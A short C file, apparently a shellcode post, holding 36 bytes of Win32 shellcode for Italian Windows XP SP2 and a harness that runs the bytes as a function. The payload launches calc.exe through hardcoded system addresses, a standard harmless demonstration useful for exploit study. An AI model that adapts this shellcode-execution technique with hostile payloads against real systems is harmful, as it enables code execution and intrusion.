/*
Title: Windows XP Professional SP2 ita calc.exe shellcode 36 bytes
Type: Shellcode
Author: Stoke
Platform: win32
Tested on: Windows XP Professional SP2 ita
*/

#include <stdio.h>
#include <string.h>

int main() {
char shell[] =  "\xeb\x16\x5b\x31\xc0\x50\x53\xbb"
                "\x8d\x15\x86\x7c\xff\xd3\x31\xc0"
                "\x50\xbb\xea\xcd\x81\x7c\xff\xd3"
                "\xe8\xe5\xff\xff\xff\x63\x61\x6c"
                "\x63\x2e\x65\x78\x65";

printf("Shellcode lenght %d\n", strlen(shell));
getchar();
((void (*)()) shell)();
return 0;
}



